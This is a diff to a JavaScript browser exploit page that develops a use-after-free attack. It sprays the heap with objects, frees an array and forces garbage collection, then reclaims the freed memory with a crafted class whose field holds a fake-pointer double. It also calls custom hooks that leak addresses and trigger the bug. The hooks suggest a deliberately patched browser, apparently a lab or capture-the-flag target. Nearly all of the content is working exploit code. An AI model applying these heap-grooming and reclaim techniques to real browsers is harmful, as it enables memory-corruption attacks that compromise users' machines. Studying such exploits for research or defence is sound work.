@@ -7,21 +7,47 @@
 <button onclick="spray()">Spray</button>
 <button onclick="multiple_alloc()">Alloc multi</button>
 <button onclick="trigger()">Trigger</button>
-<button onclick="triage()">Triage</button>
 <script>
 var barrier = [];
 var holes = [];
+var optimize = [];
+
+class X {
+    constructor() {
+	this.a = 16,
+	this.b = 15,
+	this.c = 14,
+	this.d = 13,
+	this.e = 12,
+	this.f = 11,
+	this.g = 1.459648451185831e-303,
+	this.h = 9,
+	this.i = 8,
+	this.j = 7,
+	this.k = 6,
+	this.l = 5,
+	this.m = 4,
+	this.n = 3,
+	this.o = 2,
+	this.p = 1
+    }
+}
 
 function spray() {
-    for (let i = 0; i < 248; ++i) {
+    for (let i = 0; i < 247; ++i) {
 	barrier.push({a: "a", b: "b", c: "c", d: "d", e: "e"});
     }
 
     let tmp1 = [];
     for (let j = 0; j < 4; ++j) {
 	let tmp_arr = [];
+	let numIter = 250;
+	if (j == 0) {
+	    numIter = 249;
+	    tmp_arr.push({a: "a", b: "b", c: "c", d: "d", e: "e"});
+	}
 	tmp1.push({a: "a", b: "b", c: "c", d: "d", e: "e"});
-	for (let i = 0; i < 250; ++i) {
+	for (let i = 0; i < numIter; ++i) {
 	    tmp_arr.push({a: "a", b: "b", c: "c", d: "d", e: "e"});
 	}
 	holes.push(tmp_arr);
@@ -40,13 +66,7 @@ function alloc_uaf() {
     document.cloneObj(tmp);
 }
 
-function triage() {
-    let y = new ImageData(1, 0x4000);
-    document.leakAddr(y);
-    postMessage("", "*", [y.data.buffer]);
-    history.pushState(y,"");
-}
-
+var reclaim;
 function trigger() {
     /*
     gc();
@@ -54,8 +74,11 @@ function trigger() {
     */
     holes[0] = undefined;
     gc();
+    document.leakState();
+    reclaim = new X();
+    document.leakAddr(reclaim);
     setTimeout(function() {
-	alert(document.triggerUAF());
+	// alert(document.triggerUAF(reclaim));
     }, 1000);
 }
 
